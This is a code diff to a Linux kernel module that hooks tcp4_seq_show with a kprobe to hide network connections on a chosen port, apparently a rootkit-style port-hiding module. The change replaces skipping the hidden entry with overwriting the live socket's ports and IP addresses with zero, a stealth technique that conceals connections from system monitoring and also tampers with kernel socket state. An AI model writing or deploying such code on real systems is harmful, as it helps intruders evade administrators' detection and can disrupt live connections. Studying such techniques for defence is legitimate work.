@@ -1,7 +1,6 @@
 // SPDX-License-Identifier: GPL-2.0-only
 /*
  * https://github.com/torvalds/linux/blob/master/samples/kprobes/kprobe_example.c
- * https://xcellerator.github.io/posts/linux_rootkits_08/
  */
 
 #define pr_fmt(fmt) "%s: " fmt, __func__
@@ -23,7 +22,6 @@ static struct kprobe kp = {
 	.symbol_name = "tcp4_seq_show",
 };
 
-/* kprobe pre_handler: called just before the probed instruction is executed */
 static int __kprobes handler_pre(struct kprobe *p, struct pt_regs *regs)
 {
 	void *v;
@@ -45,21 +43,21 @@ static int __kprobes handler_pre(struct kprobe *p, struct pt_regs *regs)
 	dbg_print("Argument v (regs->si): %px\n", v);
 
 	if (v == SEQ_START_TOKEN)
-		return 0; // Normal processing
+		return 0;
 
 	// Interpret v as struct sock
 	sk = (struct sock *)v;
 	dbg_print("sock: %px\n", sk);
 
 	if (!sk)
-		return 0; // Normal processing
+		return 0;
 
 	// Convert sock to inet_sock
 	inet = inet_sk(sk);
 	dbg_print("inet_sock: %px\n", inet);
 
 	if (!inet)
-		return 0; // Normal processing
+		return 0;
 
 	// Take local and remote ports from struct
 	local_port = ntohs(inet->inet_sport);
@@ -71,10 +69,23 @@ static int __kprobes handler_pre(struct kprobe *p, struct pt_regs *regs)
 	if (local_port == HIDE || remote_port == HIDE) {
 		dbg_print("Hiding local port: %u\n", local_port);
 		dbg_print("Hiding remote port: %u\n", remote_port);
-		return 1; // Skip this entry
+
+		// Overwrite Ports
+		inet->inet_sport = htons(0);
+		inet->inet_dport = htons(0);
+
+		dbg_print("Overwritten ports - Local: %u, Remote: %u\n",
+			  ntohs(inet->inet_sport), ntohs(inet->inet_dport));
+
+		// Overwrite IPs
+		inet->inet_rcv_saddr = 0;
+		inet->inet_daddr = 0;
+
+		dbg_print("IPs overwritten - Local IP: %pI4, Remote IP: %pI4\n",
+			  &inet->inet_rcv_saddr, &inet->inet_daddr);
 	}
 
-	return 0; // Allow normal processing
+	return 0;
 }
 
 static int __init port_hide_init(void)
